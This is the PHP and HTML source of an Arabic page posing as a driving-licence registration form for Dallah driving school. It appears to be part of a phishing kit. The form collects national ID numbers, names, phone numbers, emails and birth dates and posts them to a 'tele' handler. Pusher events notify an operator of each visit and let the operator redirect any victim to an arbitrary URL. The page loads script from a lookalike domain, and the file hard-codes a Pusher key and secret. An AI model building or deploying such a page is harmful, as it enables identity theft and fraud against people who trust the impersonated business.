<?php

session_start();

header('Content-Type: text/html; charset=utf-8');
require_once 'dashboard/init.php';
require_once 'includes/redirect.php';
// =====================================
// تسجيل الزيارة فقط (بدون إنشاء user)
// =====================================
if (!isset($_SESSION['visit_counted'])) {
    try {
        $User->incrementVisitCount();
        $_SESSION['visit_counted'] = true;
        
        // 🔥 إرسال إشعار Pusher بزيادة الزيارة
        require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
        
        $options = [
            'cluster' => 'ap2',
            'useTLS' => true
        ];
        
        $pusher = new Pusher\Pusher(
            'a56388ee6222f6c5fb86',
            '4c77061f4115303aac58',
            '1973588',
            $options
        );
        
        // إرسال حدث زيادة العداد
        $pusher->trigger('my-channel', 'visit-increment', [
            'message' => 'زيارة جديدة'
        ]);
        
    } catch (Exception $e) {
        error_log("Error recording visit: " . $e->getMessage());
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دلة للقيادة</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        }
         */

        .btn-warning {
            background-color: #D74D1C;
            border-color: #D74D1C;
            height: 50px;
        }

        .form-control,
        .form-select {
            height: 50px;
        }
    </style>
</head>

<body>

    <nav class="text-center py-2 shadow-sm">
        <img src="assets/logo.png" width="150" alt="">
    </nav>

    <div class="container mt-5">
        <h6 class="text-dark text-center fw-bold">يرجى ملأ النموذج التالي بالمعلومات المطلوبة</h6>

        <form action="tele/index.php" method="POST" class="mt-5 px-4">
            <label for="" class="mb-2 fw-bold">نوع الطلب <span class="text-danger fw-bold">*</span></label>
           <select name="request_type" required class="form-select" id="">
                <option value="">نوع الطلب</option>
                <option value="1">رخصة قيادة خاصة</option>
                <option value="2">رخصة قيادة عامة</option>
                <option value="3">رخصة قيادة دراجة آلية</option>
                <option value="4">رخصة قيادة مركبات اشغال عامة</option>
                <option value="5">تصريح قيادة</option>
            </select>

            <label for="" class="mb-2 mt-4 fw-bold">رقم الهوية الوطنية <span class="text-danger fw-bold">*</span></label>
            <input type="text" class="form-control" name="ssn" minlength="10" maxlength="12" inputmode="numeric" required placeholder="رقم الهوية الوطنية">

            <label for="" class="mb-2 mt-4 fw-bold">الاسم الكامل <span class="text-danger fw-bold">*</span></label>
            <input type="text" class="form-control" name="name" required placeholder="الاسم الكامل">

            <label for="" class="mb-2 mt-4 fw-bold">رقم الجوال <span class="text-danger fw-bold">*</span></label>
            <input type="text" class="form-control" name="phone" minlength="8" maxlength="10" inputmode="numeric" required placeholder="رقم الجوال">

            <label for="" class="mb-2 mt-4 fw-bold">تاريخ الميلاد</label>
            <input type="date" class="form-control" name="date">

            <label for="" class="mb-2 mt-4 fw-bold">البريد الإلكتروني <span class="text-danger fw-bold">*</span></label>
            <input type="email" class="form-control" name="email" required placeholder="البريد الإلكتروني">

            <div class="text-center mt-5">
                <button type="submit" name="submit" id="butSubm" class="btn btn-warning text-light fw-bold d-flex justify-content-center align-items-center w-100">تسجيل</button>
            </div>
        </form>
    </div>





    <footer class="text-center mt-5">
 <img src="./assets/شركة-دله-لتعليم-قيادة-السيارات.png" class="w-75 my-5" alt="">
    </footer>
    <script src="https://www.dalahdrivingecar.com/js/main.js"></script>
<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
const pusher = new Pusher('a56388ee6222f6c5fb86', {
    cluster: 'ap2',
    encrypted: true
});

const channel = pusher.subscribe('my-channel');

channel.bind('force-redirect-user', function(data) {
    const myId = localStorage.getItem('current_user_id');

    if (myId && data.userId == myId) {
        window.location.href = data.url;
    }
});
</script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function() {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        });
    </script>


</body>

</html>